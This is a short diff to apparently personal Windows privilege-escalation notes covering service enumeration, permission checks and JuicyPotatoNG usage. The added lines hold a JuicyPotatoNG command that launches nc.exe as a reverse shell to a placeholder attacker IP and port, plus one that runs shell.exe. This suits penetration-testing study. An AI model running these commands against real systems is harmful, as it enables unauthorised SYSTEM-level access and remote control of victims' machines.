@@ -47,9 +47,6 @@ We can query the wmi class `win32_service` in the following manner:
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 ```
 
-(will only work over RDP, not WinRM or a nc shell).
-
-
 Once we identify a potentially vulnerable service, we can use `Get-ACL` or `icacls` to check permissions of the services.
 
 We are looking for services where we are:
@@ -169,7 +166,8 @@ or if you don't have an interactive shell:
 ```
 
 ```
-./JuicyPotatoNG.exe -t * -p "C:/Users/chris/Desktop/nc.exe" -a "${ATTACKER_IP} ${ATTACKER_PORT} -e cmd"
+./JuicyPotatoNG.exe -t * -p "./nc.exe" -a "${ATTACKER_IP} ${ATTACKER_PORT} -e cmd"
+./JuicyPotatoNG.exe -t * -p "./shell.exe" 
 ```
 
 If one doesn't work, try them all.
